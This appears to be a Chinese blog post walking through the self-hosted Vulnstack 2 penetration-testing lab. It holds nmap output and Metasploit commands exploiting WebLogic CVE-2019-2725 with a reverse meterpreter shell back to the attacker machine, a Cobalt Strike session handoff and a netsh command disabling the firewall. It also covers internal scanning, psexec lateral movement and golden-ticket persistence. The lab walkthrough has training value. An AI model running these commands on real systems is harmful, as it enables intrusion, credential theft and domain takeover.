@@ -1,0 +1,261 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>红日靶场(vulnstack二) | Xinyuan's blog</title><meta name="keywords" content="内网渗透"><meta name="author" content="鑫缘,xy_404@163.com"><meta name="copyright" content="鑫缘"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="红日靶场(vulnstack二) 123PC(域成员)：(内：10.10.10.201  &#x2F; 外：192.168.10.251)DC(域控)：(内：10.10.10.10)WEB:（内：10.10.10.80 &#x2F; 外：192.168.10.177）  由于没有做免杀等操作，所以将机器中的360全关了。 WEB:192.168.10.177信息搜集12345678910111213141516171">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场(vulnstack二)">
+<meta property="og:url" content="http://websec.space/2022/10/25/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%BA%8C)/index.html">
+<meta property="og:site_name" content="Xinyuan&#39;s blog">
+<meta property="og:description" content="红日靶场(vulnstack二) 123PC(域成员)：(内：10.10.10.201  &#x2F; 外：192.168.10.251)DC(域控)：(内：10.10.10.10)WEB:（内：10.10.10.80 &#x2F; 外：192.168.10.177）  由于没有做免杀等操作，所以将机器中的360全关了。 WEB:192.168.10.177信息搜集12345678910111213141516171">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3d5a1cc8076c43d99d41fe79431e92d3.png">
+<meta property="article:published_time" content="2022-10-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-25T14:20:08.926Z">
+<meta property="article:author" content="鑫缘">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/3d5a1cc8076c43d99d41fe79431e92d3.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://websec.space/2022/10/25/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%BA%8C)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日靶场(vulnstack二)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-25 22:20:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Xinyuan's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img-blog.csdnimg.cn/3d5a1cc8076c43d99d41fe79431e92d3.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Xinyuan's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 视频</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场(vulnstack二)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-24T16:00:00.000Z" title="发表于 2022-10-25 00:00:00">2022-10-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-25T14:20:08.926Z" title="更新于 2022-10-25 22:20:08">2022-10-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场(vulnstack二)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="红日靶场-vulnstack二"><a href="#红日靶场-vulnstack二" class="headerlink" title="红日靶场(vulnstack二)"></a>红日靶场(vulnstack二)</h1><p><img src="https://img-blog.csdnimg.cn/c18d3b037e47480e83fb9c9ebec24db6.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PC(域成员)：(内：10.10.10.201  / 外：192.168.10.251)</span><br><span class="line">DC(域控)：(内：10.10.10.10)</span><br><span class="line">WEB:（内：10.10.10.80 / 外：192.168.10.177）</span><br></pre></td></tr></table></figure>
+
+<p>由于没有做免杀等操作，所以将机器中的360全关了。</p>
+<h2 id="WEB-192-168-10-177"><a href="#WEB-192-168-10-177" class="headerlink" title="WEB:192.168.10.177"></a>WEB:192.168.10.177</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -sS 192.168.10.177                                                               </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-10-17 10:29 EDT</span><br><span class="line">Nmap scan report for WEB (192.168.10.177)</span><br><span class="line">Host is up (0.0037s latency).</span><br><span class="line">Not shown: 988 filtered ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">7001/tcp  open  afs3-callback</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:68:D3:5F (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.33 seconds</span><br></pre></td></tr></table></figure>
+
+<p>由于是自己部署的服务，就不假装不知道了，既然7001端口开着，直接打weblogic</p>
+<p>从网上找了一个现成的poc</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rabbitmask/WeblogicScan">rabbitmask/WeblogicScan: Weblogic一键漏洞检测工具，V1.5，更新时间：20200730 (github.com)</a></p>
+<p><img src="https://img-blog.csdnimg.cn/92098fc02d564fe8893aaba1634f8564.png" alt="img"></p>
+<p>发现存在漏洞</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h4><p>找几个网上现成的文章跟着打一下</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.10.177:7001/_async/AsyncResponseService">192.168.10.177:7001/_async/AsyncResponseService</a>存在，存在漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/777eda6deb484c3d8f66254514d6afeb.png" alt="img">                           </p>
+<p>直接用msf，扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2019-2725</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set rhost 192.168.10.177</span><br><span class="line">set lhost 192.168.10.167</span><br><span class="line">set target 1</span><br><span class="line">run</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/27aba841b3da47dca1cf0e25d48e1863.png" alt="image-20221025144003173"></p>
+<p>成功getshell</p>
+<p>将msf的session传递给cs，其中LHOST和LPORT为cs正常监听器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST ip</span><br><span class="line">set LPORT 3367</span><br><span class="line">set session 5</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/e418228bcf5e438292af2784c05feafe.png" alt="image-20221025150316574"></p>
+<p>成功上线</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h4 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h4><p>信息搜集有点受阻</p>
+<p>net view 回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain&gt;net view</span><br><span class="line">net view</span><br><span class="line">System error 6118 has occurred.</span><br><span class="line"></span><br><span class="line">The list of servers for this workgroup is not currently available</span><br></pre></td></tr></table></figure>
+
+<p>6118报错</p>
+<p>然后跑去DC域控服务器net view一下发现是空列表</p>
+<p>win+r 输入services.mst，然后开启computer browser</p>
+<p>这时候去net view就有一个DC了，可是PC还没有加入</p>
+<p>而WEB还是这个报错</p>
+<p>直接进入PC，管理员权限打开powershell输入关闭防火墙指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>回显“确定”</p>
+<p>这样即可正常进行信息搜集了</p>
+<h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>net view</p>
+<p><img src="https://img-blog.csdnimg.cn/6637371503284898a6904d78fcef8fae.png" alt="image-20221025163359820"></p>
+<p>net user</p>
+<p><img src="https://img-blog.csdnimg.cn/c27b985e64d744939b6a35c19430bc36.png" alt="image-20221025152123861"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内网10.10.10.1/24网段，域控IP 10.10.10.10</span><br><span class="line">weblogic 10.10.10.80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/d65e059d6f1c4c85bf460aa072a4625d.png" alt="image-20221025152954116"></p>
+<h3 id="抓取hash"><a href="#抓取hash" class="headerlink" title="抓取hash"></a>抓取hash</h3><p><img src="https://img-blog.csdnimg.cn/e08c739fdda643a6a2ce798226b1224f.png" alt="image-20221025153152055"></p>
+<h3 id="获取密码用户名"><a href="#获取密码用户名" class="headerlink" title="获取密码用户名"></a>获取密码用户名</h3><p><img src="https://img-blog.csdnimg.cn/1a1d653b604d4c3b81432069ee4257ff.png" alt="image-20221025153509736"></p>
+<h3 id="fscan内网渗透"><a href="#fscan内网渗透" class="headerlink" title="fscan内网渗透"></a>fscan内网渗透</h3><p>通过cs上传fscan对内网进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 10.10.10.80/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/bd450bbabf2d492dacc991f5114900f3.png" alt="image-20221025182647309"></p>
+<h3 id="metaploit进行横向"><a href="#metaploit进行横向" class="headerlink" title="metaploit进行横向"></a>metaploit进行横向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set session 6</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/47b9454b0530442db5a29ea55803f2c4.png" alt="image-20221025184022733"></p>
+<p>一打就蓝屏</p>
+<h4 id="psexec-使用凭证登录其他主机"><a href="#psexec-使用凭证登录其他主机" class="headerlink" title="psexec 使用凭证登录其他主机"></a>psexec 使用凭证登录其他主机</h4><p><img src="https://img-blog.csdnimg.cn/e4c67dc41c364f05ae83ab72a65452ec.png" alt="image-20221025193629435"></p>
+<p>用前面拿到的域控账户密码，直接登陆</p>
+<p>获取到其他两台机子的beacon</p>
+<p><img src="https://img-blog.csdnimg.cn/84f91fcd9a88433b96ce32f99dbf2d0f.png" alt="image-20221025194407604"></p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="制作黄金票据的前提条件"><a href="#制作黄金票据的前提条件" class="headerlink" title="制作黄金票据的前提条件"></a>制作黄金票据的前提条件</h4><blockquote>
+<ol>
+<li>域名称</li>
+<li>域的 SID</li>
+<li>域的 krbtgt账户的密码 hash 值 （NTLM or aes256_hmac）</li>
+<li>伪造的用户名，可以是任意用户甚至是不存在</li>
+</ol>
+<p>krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户</p>
+</blockquote>
+<p>抓取一下DC的明文密码</p>
+<p><img src="https://img-blog.csdnimg.cn/bc37abf897bd4045a3c440b932273fb3.png" alt="image-20221025194710061"></p>
+<p>执行命令：</p>
+<p><img src="https://img-blog.csdnimg.cn/a4e64fed2d18437789d3f566e3ad7343.png" alt="image-20221025195057256"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:xy_404@163.com">鑫缘</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://websec.space/2022/10/25/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%BA%8C)/">http://websec.space/2022/10/25/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%BA%8C)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://websec.space/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://websec.space" target="_blank">Xinyuan's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="https://img-blog.csdnimg.cn/3d5a1cc8076c43d99d41fe79431e92d3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/10/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%B8%80)/"><img class="next-cover" src="https://img-blog.csdnimg.cn/e39a99e6d0b543c3a2e2f5c70f5148b6.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">红日靶场(vulnstack一)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%B8%80)/" title="红日靶场(vulnstack一)"><img class="cover" src="https://img-blog.csdnimg.cn/e39a99e6d0b543c3a2e2f5c70f5148b6.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-12</div><div class="title">红日靶场(vulnstack一)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">鑫缘</div><div class="author-info__description">穹镜SkyMirror 成员，安全方向爱好者</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xinyuan-404"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xinyuan-404" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xy_404@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-vulnstack%E4%BA%8C"><span class="toc-number">1.</span> <span class="toc-text">红日靶场(vulnstack二)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-192-168-10-177"><span class="toc-number">1.1.</span> <span class="toc-text">WEB:192.168.10.177</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">1.1.2.</span> <span class="toc-text">getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2725"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">CVE-2019-2725</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E6%8F%92%E6%9B%B2"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">小插曲</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96hash"><span class="toc-number">1.2.2.</span> <span class="toc-text">抓取hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">获取密码用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">fscan内网渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#metaploit%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91"><span class="toc-number">1.2.5.</span> <span class="toc-text">metaploit进行横向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec-%E4%BD%BF%E7%94%A8%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">psexec 使用凭证登录其他主机</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.2.6.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">制作黄金票据的前提条件</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/10/25/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%BA%8C)/" title="红日靶场(vulnstack二)"><img src="https://img-blog.csdnimg.cn/3d5a1cc8076c43d99d41fe79431e92d3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场(vulnstack二)"/></a><div class="content"><a class="title" href="/2022/10/25/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%BA%8C)/" title="红日靶场(vulnstack二)">红日靶场(vulnstack二)</a><time datetime="2022-10-24T16:00:00.000Z" title="发表于 2022-10-25 00:00:00">2022-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%B8%80)/" title="红日靶场(vulnstack一)"><img src="https://img-blog.csdnimg.cn/e39a99e6d0b543c3a2e2f5c70f5148b6.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场(vulnstack一)"/></a><div class="content"><a class="title" href="/2022/10/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(vulnstack%E4%B8%80)/" title="红日靶场(vulnstack一)">红日靶场(vulnstack一)</a><time datetime="2022-10-11T16:00:00.000Z" title="发表于 2022-10-12 00:00:00">2022-10-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cwp/" title="春秋云镜wp day1"><img src="https://img-blog.csdnimg.cn/7b3a22bbfc4f44768b41a28106f9286a.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜wp day1"/></a><div class="content"><a class="title" href="/2022/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cwp/" title="春秋云镜wp day1">春秋云镜wp day1</a><time datetime="2022-10-09T16:00:00.000Z" title="发表于 2022-10-10 00:00:00">2022-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" 